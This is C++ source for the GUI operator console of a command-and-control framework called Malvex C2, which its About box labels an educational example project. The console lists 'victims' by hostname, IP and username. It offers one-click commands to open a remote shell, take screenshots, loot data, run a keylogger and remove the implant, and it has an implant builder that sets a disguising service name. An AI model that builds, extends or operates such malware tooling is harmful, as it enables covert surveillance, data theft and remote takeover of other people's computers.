#include "UI.hpp"
#include "Builder.hpp"
#include "Client.hpp"
#include "LogManager.hpp"
#include "FileBrowser.hpp"

#include <raylib.h>
#include <string>
#include <thread>
#include <vector>

// function prototypes
void drawConnectionsTab(WindowState& res);
void drawSettingsTab(WindowState& state);
void drawLogsTab(WindowState& state);
void drawBuilderTab(WindowState& state);
void drawSessionsTab(WindowState& state);
void drawAbout(WindowState& state);
void drawLogin(WindowState& state);

//-------------------------------------------------
//
//-------------------------------------------------
int main() {
    WindowState state{
        .show_about=false,
        .is_fullscreen=false,
        .res={ 1200, 800},
        .font={},
        .current_tab=Tab::CONNECTIONS,
        .is_connected=false,
        .user_settings={},
        .implant_settings={},
        .client=Client::instance(),
        .builder=Builder::instance(),
        .wait_for_response=false,
        .login_failed=false
    };

    // load malvex config:
    strncpy(state.user_settings.username.text, state.client.getUsername().c_str(), sizeof(state.user_settings.username.text));
    strncpy(state.user_settings.password.text, state.client.getPassword().c_str(), sizeof(state.user_settings.password.text));
    strncpy(state.user_settings.server_url.text, state.client.getServerUrl().c_str(), sizeof(state.user_settings.server_url.text));
    strncpy(state.user_settings.default_timeout.text, state.client.getTimeout().c_str(), sizeof(state.user_settings.default_timeout.text));
    strncpy(state.user_settings.output_file_path.text, state.client.getOutputPath().c_str(), sizeof(state.user_settings.output_file_path.text));

    // load builder settings:
    strncpy(state.implant_settings.username.text, state.builder.getUsername().c_str(), sizeof(state.implant_settings.username.text));
    strncpy(state.implant_settings.password.text, state.builder.getPassword().c_str(), sizeof(state.implant_settings.password.text));
    strncpy(state.implant_settings.server_url.text, state.builder.getServerURL().c_str(), sizeof(state.implant_settings.server_url.text));
    strncpy(state.implant_settings.default_timeout.text, state.builder.getTimeout().c_str(), sizeof(state.implant_settings.default_timeout.text));
    strncpy(state.implant_settings.output_file_path.text, state.builder.getOutputDir().c_str(), sizeof(state.implant_settings.output_file_path.text));
    strncpy(state.implant_settings.service_name.text, state.builder.getServiceName().c_str(), sizeof(state.implant_settings.service_name.text));
    strncpy(state.implant_settings.service_description.text, state.builder.getServiceDesc().c_str(), sizeof(state.implant_settings.service_description.text));


    Resolution old_res = state.res;
    auto& client = Client::instance();

    const std::string title{ GuiIconText(ICON_DEMON, "Malvex C2 - GUI Client") };

    // Set up the window
    SetConfigFlags(FLAG_WINDOW_RESIZABLE);
    InitWindow(state.res.width, state.res.height, title.c_str());
    SetTargetFPS(30);
    GuiLoadStyleDark();
    const auto bg_color = GetColor(GuiGetStyle(DEFAULT, BACKGROUND_COLOR));

    // Set custom font
    state.font = LoadFont("Resources/Font.ttf");
    GuiSetFont(state.font);

    // Check if we already have a bearer token
    if (client.hasServerSession()) {
        state.is_connected = true;
    }

    // Render Loop
    while (not WindowShouldClose()) {
        BeginDrawing();
        ClearBackground(bg_color);

        // Update Resoulution
        state.res = {
            static_cast<float>(GetScreenWidth()),
            static_cast<float>(GetScreenHeight())
        };

        // --- Menu Bar ---
        GuiDummyRec({0, 0, state.res.width, 24}, nullptr); // Background
        if(GuiButton({8, 4, 80, 16}, GuiIconText(ICON_INFO, "About"))) {
            state.show_about = true;
        }

        GuiLabel({state.res.width/2 - 100, 4, 200, 16}, title.c_str());

        if (GuiButton({state.res.width - 20, 4, 16, 16,}, "X")) {
            break;
        }

        if (GuiButton({state.res.width - 130, 4, 100, 16,}, GuiIconText(ICON_CURSOR_SCALE_FILL, "Fullscreen"))) {
            state.is_fullscreen = not state.is_fullscreen;

            if (state.is_fullscreen) {
                int m = GetCurrentMonitor();
                old_res = state.res;
                Resolution new_res{
                    static_cast<float>(GetMonitorWidth(m)),
                    static_cast<float>(GetMonitorHeight(m))
                };

                ToggleFullscreen();
                SetWindowSize(new_res.width, new_res.height);
            } else {
                ToggleFullscreen();
                SetWindowSize(old_res.width, old_res.height);
            }
        }

        // Draw popup if active
        if (not state.is_connected) {
            drawLogin(state);
        } else if (state.show_about) {
            drawAbout(state);
        } else {
            // --- Tab Bar ---
            Rectangle tabBar = {0, 28, state.res.width, 28};
            GuiGroupBox(tabBar, nullptr);

            float tabWidth = tabBar.width / tabs.size();
            for (size_t i = 0; i < tabs.size(); i++) {
                Rectangle r{ tabWidth * i, 28, tabWidth, 28 };

                //highlight currently selected tab
                int originalBase = GuiGetStyle(BUTTON, BASE_COLOR_NORMAL);
                int originalText = GuiGetStyle(BUTTON, TEXT_COLOR_NORMAL);

                // Apply active colors
                if (state.current_tab == (Tab)i) {
                    GuiSetStyle(BUTTON, BASE_COLOR_NORMAL, ColorToInt(RED));
                    GuiSetStyle(BUTTON, TEXT_COLOR_NORMAL, ColorToInt(YELLOW));
                }

                if (GuiButton(r, tabs.at(i).c_str())) {
                    state.current_tab = (Tab)i;
                }

                //restore original style
                GuiSetStyle(BUTTON, BASE_COLOR_NORMAL, originalBase);
                GuiSetStyle(BUTTON, TEXT_COLOR_NORMAL, originalText);
            }

            // --- Active Tab ---
            switch(state.current_tab) {
                case Tab::CONNECTIONS:
                    drawConnectionsTab(state);
                    break;
                case Tab::LOGS:
                    drawLogsTab(state);
                    break;
                case Tab::SETTINGS:
                    drawSettingsTab(state);
                    break;
                case Tab::BUILDER:
                    drawBuilderTab(state);
                    break;
                case Tab::TERMINAL:
                    drawSessionsTab(state);
                    break;
            }
        }

        // Send off the Log Buffer:
        if (not state.client.sendLogBuffer()) {
            LogManager::instance().local_log("Failed to send Attack logs to the Server!");
        }

        // --- Status Bar ---
        Rectangle status = {0, state.res.height - 24, state.res.width, 24};
        GuiStatusBar(status, client.getStatusText());

        EndDrawing();
    }

    CloseWindow();
    return 0;
}

//-------------------------------------------------
//
//-------------------------------------------------
void drawConnectionsTab(WindowState& state) {
    static Vector2 scroll = {0, 0};
    static Rectangle view = {0, 0, 0, 0};
    static Rectangle content = {0, 0, 0, 30 * 25};
    static Vector2 menuPos = {};
    static bool menuVisible = false;
    static int selectedRow = -1;
    static int hoveredRow = -1;
    static LogManager& logMan = LogManager::instance();

    const auto& res{ state.res };

    GuiLabel({res.width/2 - 100, 50, 200, 30}, "List of Victim Connections");

    if (GuiButton({3, 58, 120, 20}, GuiIconText(ICON_REPEAT_FILL, "Refresh List"))) {
        if(Client::instance().fetchVictims()) {
            logMan.local_log("Fetched Victims from Server");
        } else {
            logMan.local_log("Refreshing the Victim List failed!");
        }
    }

    Rectangle tableRect{0, 80, res.width, res.height - 90};
    GuiPanel(tableRect, "");

    // Table header
    const char* headers[] = {
        "ID", "Hostname", "LAN", "WAN", "OS",
        "Username", "Status"
    };
    constexpr int colCount = 7;

    float colWidth = (tableRect.width-10) / colCount;

    for (int i = 0; i < colCount; i++) {
        Rectangle r{tableRect.x + i * colWidth, tableRect.y, colWidth, 24};
        GuiDrawRectangle(r, 1, GRAY, BLACK);
        GuiLabel(r, headers[i]);
    }

    float panelTop = tableRect.y + 26;
    Rectangle panelRect {
        0,
        panelTop,
        res.width,
        res.height - panelTop
    };

    // Detect hovered row
    Vector2 mouse = GetMousePosition();

    // Convert mouse into panel local coordinates
    if (not menuVisible && CheckCollisionPointRec(mouse, panelRect)) {
        float localY = mouse.y - panelRect.y - scroll.y;
        if (localY >= 0 && localY < content.height) {
            hoveredRow = (int)(localY / 25);
            if (hoveredRow >= 50)
                hoveredRow = -1;
        }
    }

    GuiScrollPanel(panelRect, nullptr, content, &scroll, &view);

    BeginScissorMode(panelRect.x, panelRect.y, panelRect.width, panelRect.height);

    const auto& victims = Client::instance().getVictims();

    colWidth = (tableRect.width-10) / colCount;
    for (size_t client_id{ 0 }; client_id < victims.size(); ++client_id) {
        auto line_color = client_id % 2 == 0 ? Color{150, 20, 70, 255} : DARKGRAY;

        // Hover highlight
        if (static_cast<int>(client_id) == hoveredRow) {
            line_color = RED;
        }

        const auto& vic{ victims[client_id] };
        const std::string values[colCount]{
            std::to_string(vic.id),
            vic.hostname,
            vic.internal_ip,
            vic.external_ip,
            vic.operating_system,
            vic.username,
            vic.status < 5 ? "ONLINE" : "OFFLINE"
        };

        for (int i = 0; i < colCount; i++) {
            Rectangle r{tableRect.x + i * colWidth, tableRect.y + scroll.y + 26 + (25*client_id), colWidth, 24};
            GuiDrawRectangle(r, 1, BLACK, line_color);
            GuiLabel(r, values[i].c_str());
        }
    }

    if (IsMouseButtonPressed(MOUSE_RIGHT_BUTTON) && hoveredRow >= 0) {
        menuVisible = true;
        menuPos = mouse;
        selectedRow = hoveredRow;
    }

    if (menuVisible && IsMouseButtonPressed(MOUSE_LEFT_BUTTON)) {
        Rectangle menuArea{menuPos.x, menuPos.y, 300, 500};
        if (not CheckCollisionPointRec(mouse, menuArea)) {
            menuVisible = false;
        }
    }

    EndScissorMode();

    if (menuVisible && selectedRow >= 0) {
        const auto btn_height{ 30 };
        Rectangle menuRect{menuPos.x, menuPos.y, 300, btn_height*9 + 10};
        GuiPanel(menuRect, GuiIconText(ICON_DEMON, TextFormat("Attack Victim #%d", selectedRow)));

        Rectangle btn1{menuRect.x + 10, menuRect.y + btn_height*1, 280, 25};
        Rectangle btn2{menuRect.x + 10, menuRect.y + btn_height*2, 280, 25};
        Rectangle btn3{menuRect.x + 10, menuRect.y + btn_height*3, 280, 25};
        Rectangle btn4{menuRect.x + 10, menuRect.y + btn_height*4, 280, 25};
        Rectangle btn5{menuRect.x + 10, menuRect.y + btn_height*5, 280, 25};
        Rectangle btn6{menuRect.x + 10, menuRect.y + btn_height*6, 280, 25};
        Rectangle btn7{menuRect.x + 10, menuRect.y + btn_height*7, 280, 25};
        Rectangle btn8{menuRect.x + 10, menuRect.y + btn_height*8, 280, 25};

        const auto timeout = std::atol(state.user_settings.default_timeout.text);
        const auto port = 4444;
        const auto victim = victims[selectedRow];

        if (GuiButton(btn1, TextFormat("Timeout Client %d for %d min", victim.id, static_cast<int>(timeout)))) {
            if(state.client.sendTimeoutCommand(victim.uid, timeout)) {
                logMan.attack_log(std::format("Timeout Command Send to Client: {}", victim.uid));
            } else {
                logMan.local_log("Sending Timeout Command failed!");
            }
            menuVisible = false;
        }

        if (GuiButton(btn2, TextFormat("Open Shell (Port: %d)", port))) {
            if(state.client.sendOpenSessionCommand(victim.uid, port)) {
                logMan.attack_log(std::format("Opening Session to Client: {} on Port: {}", victim.uid, port));
            } else {
                logMan.local_log("Sending Open Session Command failed!");
            }
            menuVisible = false;
            state.current_tab = Tab::TERMINAL;
        }
        if (GuiButton(btn3, "Close open Shells")) {
            if(state.client.sendCloseSessionCommand(victim.uid)) {
                logMan.attack_log(std::format("Closing Open Sessions for Client: {}", victim.uid));
            } else {
                logMan.local_log("Sending Timeout Command failed!");
            }
            menuVisible = false;
        }
        if (GuiButton(btn4, "Take Screenshot")) {
            if(state.client.sendScreenshotCommand((victim.uid))) {
                logMan.attack_log(std::format("Screenshot Command Send to Client: {}", victim.uid));
            } else {
                logMan.local_log("Sending Screenshot Command failed!");
            }
            menuVisible = false;
        }
        if (GuiButton(btn5, "Loot Everything!")) {
            if(state.client.sendLootCommand(victim.uid)) {
                logMan.attack_log(std::format("Loot Command Send to Client: {}", victim.uid));
            } else {
                logMan.local_log("Sending Loot Command failed!");
            }
            menuVisible = false;
        }
        if (GuiButton(btn6, "Start Keylogger")) {
            if(state.client.sendStartKeyloggerCommand(victim.uid)) {
                logMan.attack_log(std::format("Starting Keylogger on Client: {}", victim.uid));
            } else {
                logMan.local_log("Starting Keylogger failed!");
            }
            menuVisible = false;
        }
        if (GuiButton(btn7, "Stop Keylogger")) {
            if(state.client.sendStopKeyloggerCommand(victim.uid)) {
                logMan.attack_log(std::format("Stopping Keylogger on Client: {}", victim.uid));
            } else {
                logMan.local_log("Stopping Keylogger failed!");
            }
            menuVisible = false;
        }
        if (GuiButton(btn8, "Uninstall Implant")) {
            if(state.client.sendUninstallCommand(victim.uid)) {
                logMan.attack_log(std::format("Uninstalling Implant on Client: {}", victim.uid));
            } else {
                logMan.local_log("Uninstalling failed!");
            }
            menuVisible = false;
        }
    }
}

//-------------------------------------------------
//
//-------------------------------------------------
void drawLogin(WindowState& state) {
    static const Texture2D texture = LoadTexture("Resources/Logo.png");

    Rectangle popupRect = { state.res.width/2 - 300, state.res.height/2 - 130, 600, 250 };
    GuiPanel(popupRect, GuiIconText(ICON_DEMON, "Connect to MalvexC2 Server"));

    // Draw image inside popup
    float imageX = popupRect.x + 10;
    float imageY = popupRect.y + 40;
    float imageWidth = 200;
    float imageHeight = 200;

    DrawTexturePro(
        texture,
        Rectangle{ 0, 0, (float)texture.width, (float)texture.height },
        Rectangle{ imageX, imageY, imageWidth, imageHeight },
        Vector2{ 0, 0 },
        0.0f,
        WHITE
    );

    if (state.wait_for_response) {
        GuiTextBox(Rectangle{ popupRect.x + 250, popupRect.y + popupRect.height - 90, 300, 30 },
            const_cast<char*>("Connecting! Please Stand by ..."), 0, false);
        return;
    }

    // Username field
    GuiLabel(Rectangle{ popupRect.x + 250, popupRect.y + 40, 90, 20 }, "Username:");
    if (GuiTextBox(Rectangle{ popupRect.x + 350, popupRect.y + 40, 200, 20 },
        state.user_settings.username.text, MAX_INPUT_CHARS, state.user_settings.username.edit)) {
            state.user_settings.username.edit = not state.user_settings.username.edit;
    }

    // Password field
    GuiLabel(Rectangle{ popupRect.x + 250, popupRect.y + 10 + 30*2, 90, 20 }, "Password:");
    if (GuiTextBox(Rectangle{ popupRect.x + 350, popupRect.y + 10 + 30*2, 200, 20 },
        state.user_settings.password.text, MAX_INPUT_CHARS, state.user_settings.password.edit)) {
            state.user_settings.password.edit = not state.user_settings.password.edit;
    }

    // Server URL field
    GuiLabel(Rectangle{ popupRect.x + 250, popupRect.y + 10 + 30*3, 90, 20 }, "Server:");
    if (GuiTextBox(Rectangle{ popupRect.x + 350, popupRect.y + 10 + 30*3, 200, 20 },
        state.user_settings.server_url.text, MAX_INPUT_CHARS, state.user_settings.server_url.edit)) {
            state.user_settings.server_url.edit = not state.user_settings.server_url.edit;
    }

    // Login Button
    if (GuiButton(Rectangle{ popupRect.x + 250, popupRect.y + popupRect.height - 90, 300, 30 }, "Login")) {
        state.client.setUsername(state.user_settings.username.text);
        state.client.setPassword(state.user_settings.password.text);
        state.client.setServerUrl(state.user_settings.server_url.text);

        state.login_failed = false;
        state.wait_for_response = true;

        std::thread([&state]{
            state.is_connected = state.client.login();
            if(not state.is_connected) {
                state.login_failed = true;
            }
            state.wait_for_response = false;
        }).detach();
    }

    if (state.login_failed) {
        GuiLabel(Rectangle{ popupRect.x + 250, popupRect.y + popupRect.height - 50, 300, 30 }, "Login Failed!");
    }

    // Local Server Button
    if (not state.login_failed && GuiButton(Rectangle{ popupRect.x + 250, popupRect.y + popupRect.height - 50, 300, 30 }, "Start Local Server")) {
        state.client.setServerUrl("https://127.0.0.1:1337");
        state.client.setUsername(state.user_settings.username.text);
        state.client.setPassword(state.user_settings.password.text);

        //std::system("./server --local");

        state.is_connected = true;
    }
}

//-------------------------------------------------
//
//-------------------------------------------------
void drawAbout(WindowState& state) {
    static const Texture2D texture = LoadTexture("Resources/Logo.png");

    Rectangle popupRect = { state.res.width/2 - 300, state.res.height/2 - 130, 600, 250 };
    GuiPanel(popupRect, GuiIconText(ICON_DEMON, "About MalvexC2"));

    // Draw image inside popup
    float imageX = popupRect.x + 10;
    float imageY = popupRect.y + 40;
    float imageWidth = 200;
    float imageHeight = 200;

    DrawTexturePro(
        texture,
        Rectangle{ 0, 0, (float)texture.width, (float)texture.height },
        Rectangle{ imageX, imageY, imageWidth, imageHeight },
        Vector2{ 0, 0 },
        0.0f,
        WHITE
    );

    // Draw text below image
    const char* popupText =
        "MalvexC2 was written by Erarnitox\n"
        "For Educational Purposes only!\n"
        "This should never be used for anything\n"
        "It is only an example Project!\n\n"
        "SUBSCRIBE TO ERARNITOX ON YOUTUBE!";

    GuiLabel({ popupRect.x + 270, popupRect.y + 100, 300, 30 }, popupText);

    // Close button
    if (GuiButton(Rectangle{ popupRect.x + 250, popupRect.y + popupRect.height - 50, 300, 30 }, "Close")) {
        state.show_about = false;
    }
}

//-------------------------------------------------
//
//-------------------------------------------------
void drawLogsTab(WindowState& state) {
    static const size_t MAX_LOG_SIZE{ 4096 };
    static char logText[MAX_LOG_SIZE] = "Log started...\n";
    static Vector2 scrollOffset = { 0, 0 };
    static Rectangle logBounds = { 0, 0, 0, 0 };
    static LogManager& logMan = LogManager::instance();

    auto& res = state.res;

    GuiLabel({res.width/2 - 100, 50, 200, 30}, "C2 Event Log");

    if (GuiButton({3, 58, 120, 20}, GuiIconText(ICON_REPEAT_FILL, "Refresh Logs"))) {
        if(not state.client.fetchLogs()) {
            logMan.local_log("Fetching of remote Logs failed!");
        }

        for(const auto& log : logMan.refresh()) {
            char newEntry[128];
            snprintf(newEntry, sizeof(newEntry), "%s\n", log.c_str());

            if (strlen(logText) + strlen(newEntry) < MAX_LOG_SIZE - 1) {
                strcat(logText, newEntry);
            }
        }
    }

    Rectangle viewRect{0, 80, res.width, res.height - 90};
    GuiPanel(viewRect, "");

    // Use GuiScrollPanel for scrollable content
    GuiScrollPanel(
        viewRect,
        NULL,  // No title
        Rectangle{ 0, 0, viewRect.width - 20, 2000 },  // Content area (height estimated)
        &scrollOffset,
        &logBounds
    );

    // Draw the log text with scissor mode (clipping)
    BeginScissorMode(
        (int)viewRect.x,
        (int)viewRect.y,
        (int)viewRect.width,
        (int)viewRect.height
    );

    DrawTextEx(state.font, logText, Vector2{
                 (viewRect.x + 5),
                 (viewRect.y + 5 + scrollOffset.y)
                }, 16, 1, RAYWHITE
            );

    EndScissorMode();
}

//-------------------------------------------------
//
//-------------------------------------------------
void drawSettingsTab(WindowState& state) {
    static FileBrowser fb{ FileBrowser::Mode::SELECT_DIRECTORY };

    auto& settings = state.user_settings;

    const auto& res = state.res;

    GuiLabel({res.width/2 - 100, 50, 200, 30}, "Malvex Settings");

    Rectangle tabRect{0, 80, res.width, res.height - 90};
    GuiPanel(tabRect, "");

    float labelX = tabRect.x + 10;
    float labelWidth = 100;
    float inputX = tabRect.x + labelWidth + 5;
    float labelHeight = 20;
    float inputWidth = tabRect.width - inputX - 10;
    float inputHeight = 20;
    float startY = tabRect.y + 50;
    float spacing = labelHeight + 10;

    // Username field
    GuiLabel({labelX, startY + 5, labelWidth, labelHeight }, "Username:");
    if (GuiTextBox(Rectangle{ inputX, startY, inputWidth, inputHeight },
                    settings.username.text, MAX_INPUT_CHARS, settings.username.edit)) {
        settings.username.edit = !settings.username.edit;
    }

    // Password field
    GuiLabel({labelX, startY + 5 + spacing, labelWidth, labelHeight }, "Password:");
    if (GuiTextBox(Rectangle{ inputX, startY + spacing, inputWidth, inputHeight },
                    settings.password.text, MAX_INPUT_CHARS, settings.password.edit)) {
        settings.password.edit = !settings.password.edit;
    }

    // Timeout field
    GuiLabel({labelX, startY + 5 + spacing*2, labelWidth, labelHeight }, "Timeout:");
    if (GuiTextBox(Rectangle{ inputX, startY + spacing*2, inputWidth, inputHeight },
                    settings.default_timeout.text, MAX_INPUT_CHARS, settings.default_timeout.edit)) {
        settings.default_timeout.edit = !settings.default_timeout.edit;
    }

    // Server URL field
    GuiLabel({labelX, startY + 5 + spacing*3, labelWidth, labelHeight }, "Server:");
    if (GuiTextBox(Rectangle{ inputX, startY + spacing*3, inputWidth, inputHeight },
                    settings.server_url.text, MAX_INPUT_CHARS, settings.server_url.edit)) {
        settings.server_url.edit = !settings.server_url.edit;
    }

    // File path field with browse button
    GuiLabel({ labelX, startY + spacing*4 + 5, labelWidth, labelHeight }, "Output Dir:");
    if (GuiTextBox(Rectangle{ inputX, startY + spacing*4, inputWidth - 110, inputHeight },
                    settings.output_file_path.text, MAX_INPUT_CHARS, settings.output_file_path.edit)) {
        settings.output_file_path.edit = !settings.output_file_path.edit;
    }

    // Browse button
    if (GuiButton(Rectangle{ inputX + inputWidth - 100, startY + spacing*4, 100, inputHeight },"Browse...")) {
        fb.open();
    }

    // Save button
    Rectangle saveButtonRect = { inputX, startY + spacing*5, 200, 30 };
    if (GuiButton(saveButtonRect, "Save Settings")) {
        state.client.setUsername(settings.username.text);
        state.client.setPassword(settings.password.text);
        state.client.setServerUrl(settings.server_url.text);
    }

    fb.render();

    if (not fb.is_open() && not fb.get_selected_path().empty()) {
        strcpy(settings.output_file_path.text, fb.get_selected_path().c_str());
        fb.clear();
    }
}

//-------------------------------------------------
//
//-------------------------------------------------
void drawBuilderTab(WindowState& state) {
    static FileBrowser fb{ FileBrowser::Mode::SELECT_DIRECTORY };

    auto& settings = state.implant_settings;
    const auto& res = state.res;

    GuiLabel({res.width/2 - 100, 50, 200, 30}, "Implant Builder");

    Rectangle tabRect{0, 80, res.width, res.height - 90};
    GuiPanel(tabRect, "");

    float labelX = tabRect.x + 10;
    float labelWidth = 100;
    float inputX = tabRect.x + labelWidth + 5;
    float labelHeight = 20;
    float inputWidth = tabRect.width - inputX - 10;
    float inputHeight = 20;
    float startY = tabRect.y + 50;
    float spacing = labelHeight + 10;

    // Username field
    GuiLabel({labelX, startY + 5, labelWidth, labelHeight }, "Username:");
    if (GuiTextBox(Rectangle{ inputX, startY, inputWidth, inputHeight },
                    settings.username.text, MAX_INPUT_CHARS, settings.username.edit)) {
        settings.username.edit = !settings.username.edit;
    }

    // Password field
    GuiLabel({labelX, startY + 5 + spacing, labelWidth, labelHeight }, "Password:");
    if (GuiTextBox(Rectangle{ inputX, startY + spacing, inputWidth, inputHeight },
                    settings.password.text, MAX_INPUT_CHARS, settings.password.edit)) {
        settings.password.edit = !settings.password.edit;
    }

    // Timeout field
    GuiLabel({labelX, startY + 5 + spacing*2, labelWidth, labelHeight }, "Timeout:");
    if (GuiTextBox(Rectangle{ inputX, startY + spacing*2, inputWidth, inputHeight },
                    settings.default_timeout.text, MAX_INPUT_CHARS, settings.default_timeout.edit)) {
        settings.default_timeout.edit = !settings.default_timeout.edit;
    }

    // Server URL field
    GuiLabel({labelX, startY + 5 + spacing*3, labelWidth, labelHeight }, "Server:");
    if (GuiTextBox(Rectangle{ inputX, startY + spacing*3, inputWidth, inputHeight },
                    settings.server_url.text, MAX_INPUT_CHARS, settings.server_url.edit)) {
        settings.server_url.edit = !settings.server_url.edit;
    }

    // File path field with browse button
    GuiLabel({ labelX, startY + spacing*4 + 5, labelWidth, labelHeight }, "Output Dir:");
    if (GuiTextBox(Rectangle{ inputX, startY + spacing*4, inputWidth - 110, inputHeight },
                    settings.output_file_path.text, MAX_INPUT_CHARS, settings.output_file_path.edit)) {
        settings.output_file_path.edit = !settings.output_file_path.edit;
    }

    // Browse button
    if (GuiButton(Rectangle{ inputX + inputWidth - 100, startY + spacing*4, 100, inputHeight },"Browse...")) {
        fb.open();
    }

    // Service Name
    GuiLabel({labelX, startY + 5 + spacing*5, labelWidth, labelHeight }, "Service:");
    if (GuiTextBox(Rectangle{ inputX, startY + spacing*5, inputWidth, inputHeight },
                    settings.service_name.text, MAX_INPUT_CHARS, settings.service_name.edit)) {
        settings.service_name.edit = !settings.service_name.edit;
    }

    // Service Description
    GuiLabel({labelX, startY + 5 + spacing*6, labelWidth, labelHeight }, "Description:");
    if (GuiTextBox(Rectangle{ inputX, startY + spacing*6, inputWidth, inputHeight },
                    settings.service_description.text, MAX_INPUT_CHARS, settings.service_description.edit)) {
        settings.service_description.edit = !settings.service_description.edit;
    }

    // Build button
    Rectangle saveButtonRect = { inputX, startY + spacing*7, 200, 30 };
    if (GuiButton(saveButtonRect, "Build Implant")) {
        state.builder.setUsername(settings.username.text);
        state.builder.setPassword(settings.password.text);
        state.builder.setServerURL(settings.server_url.text);
        state.builder.setTimeout(settings.default_timeout.text);
        state.builder.setServiceName(settings.service_name.text);
        state.builder.setServiceDesc(settings.service_description.text);
        state.builder.setOutputDir(settings.output_file_path.text);

        state.builder.buildImplant();

        auto& logs = LogManager::instance();
        logs.attack_log(std::format("Registering Victim Template: {}", settings.username.text));
        if (state.client.registerTemplate(settings.username.text, settings.password.text)) {
            logs.attack_log("SUCCESS: Registred Victim Template!");
        }
    }

    fb.render();

    if (not fb.is_open() && not fb.get_selected_path().empty()) {
        strcpy(settings.output_file_path.text, fb.get_selected_path().c_str());
        fb.clear();
    }
}

//-------------------------------------------------
//
//-------------------------------------------------
void drawSessionsTab(WindowState& state) {
    static int selected_session = -1;
    static bool commandEditMode = false;
    static char terminalOutput[4096] = "Terminal started. Type 'help' for commands.\n\n";
    static char commandInput[1024] = {0};
    static float scrollOffset = 0;

    const auto& res = state.res;

    GuiLabel({res.width/2 - 100, 50, 200, 30}, "Remote Shell Sessions");

    //TODO: get sessions from session manager
    static std::vector<Session> sessions {};

    Rectangle viewRect{0, 80, res.width, res.height - 90};

    // if there are no sessions currently
    if(sessions.empty()) {
        GuiPanel(viewRect, TextFormat("Currently there are no active Sessions!"));
        return;
    } else if(selected_session < 0) {
        selected_session = 0;
    }

    for(size_t i{ 0 }; i < sessions.size(); ++i) {
        //highlight currently selected session
        int originalBase = GuiGetStyle(BUTTON, BASE_COLOR_NORMAL);
        int originalText = GuiGetStyle(BUTTON, TEXT_COLOR_NORMAL);

        // Apply active colors
        if (selected_session == (int)i) {
            GuiSetStyle(BUTTON, BASE_COLOR_NORMAL, ColorToInt(RED));
            GuiSetStyle(BUTTON, TEXT_COLOR_NORMAL, ColorToInt(YELLOW));
        }

        if (GuiButton({3 + (23*(float)i), 58, 20, 20},  TextFormat("%d", (int)i))) {
            selected_session = i;
        }

        //restore original style
        GuiSetStyle(BUTTON, BASE_COLOR_NORMAL, originalBase);
        GuiSetStyle(BUTTON, TEXT_COLOR_NORMAL, originalText);
    }

    Session& session = sessions.at(selected_session);
    GuiPanel(viewRect, TextFormat("Session %d on port %d", session.id, session.port));

    //close session button
    if (GuiButton({viewRect.width - 130, viewRect.y + 2, 120, 20},  GuiIconText(ICON_CROSS, "Close Shell"))) {
        //TODO:
    }

    // Terminal stuffs
    if (commandEditMode)
    {
        /*
        if (IsKeyPressed(KEY_UP))
        {
            if (history.currentIndex > 0)
            {
                history.currentIndex--;
                strcpy(commandInput, history.commands[history.currentIndex]);
            }
        }
        else if (IsKeyPressed(KEY_DOWN))
        {
            if (history.currentIndex < history.count - 1)
            {
                history.currentIndex++;
                strcpy(commandInput, history.commands[history.currentIndex]);
            }
            else if (history.currentIndex == history.count - 1)
            {
                history.currentIndex = history.count;
                commandInput[0] = '\0';
            }
        }*/
    }

    // Calculate text height for scrolling
    Vector2 textSize = MeasureTextEx(guiFont, terminalOutput, 16, 1);

    // Output area
    Rectangle outputRect = { viewRect.x + 10, viewRect.y + 40, viewRect.width - 20, viewRect.height - 100 };

    // Handle scrolling
    if (CheckCollisionPointRec(GetMousePosition(), outputRect))
    {
        scrollOffset -= GetMouseWheelMove() * 20;

        float maxScroll = textSize.y - outputRect.height;
        if (maxScroll < 0) maxScroll = 0;
        if (scrollOffset < 0) scrollOffset = 0;
        if (scrollOffset > maxScroll) scrollOffset = maxScroll;
    }

    // Terminal output area
    GuiGroupBox(outputRect, "Session Output");

    // Draw scrollbar
    Rectangle scrollBarBounds = { outputRect.x + outputRect.width - 14, outputRect.y,
                                    14, outputRect.height };
    float maxScroll = textSize.y - outputRect.height;
    if (maxScroll < 0) maxScroll = 0;

    if (maxScroll > 0)
    {
        GuiScrollBar(scrollBarBounds, (int)scrollOffset, 0, (int)maxScroll);
    }

    // Draw terminal output with clipping
    BeginScissorMode((int)outputRect.x, (int)outputRect.y,
                    (int)outputRect.width - 18, (int)outputRect.height);

    DrawTextEx(state.font,
                terminalOutput,
                Vector2{ outputRect.x + 5, outputRect.y + 5 - scrollOffset },
                16,
                1,
                PINK);  // Green terminal text

    EndScissorMode();

    // Command prompt area
    DrawText(">", 10, state.res.height - 60, 30, RED);

    Rectangle commandRect = { 30, res.height - 60, res.width - 200, 30 };

    // Execute button
    if (GuiButton(Rectangle{ res.width - 150, res.height - 60, 55, 30 }, "Run") ||
       GuiTextBox(commandRect, commandInput, 1024, commandEditMode)) {
        if (strlen(commandInput) > 0) {
            //AddToHistory(&history, commandInput);
            run_terminal_command(commandInput, terminalOutput, 4096);
            commandInput[0] = '\0';

            // Auto-scroll to bottom after command
            Vector2 newTextSize = MeasureTextEx(guiFont, terminalOutput, 16, 1);
            float newMaxScroll = newTextSize.y - outputRect.height;
            if (newMaxScroll > 0) {
                scrollOffset = newMaxScroll;
            }
        }
        commandEditMode = true;
    }

    // Clear button
    if (GuiButton(Rectangle{ res.width - 75, res.height - 60, 55, 30 }, "Clear")) {
        terminalOutput[0] = '\0';
        strcat(terminalOutput, "Terminal cleared.\n\n");
        scrollOffset = 0;
    }
}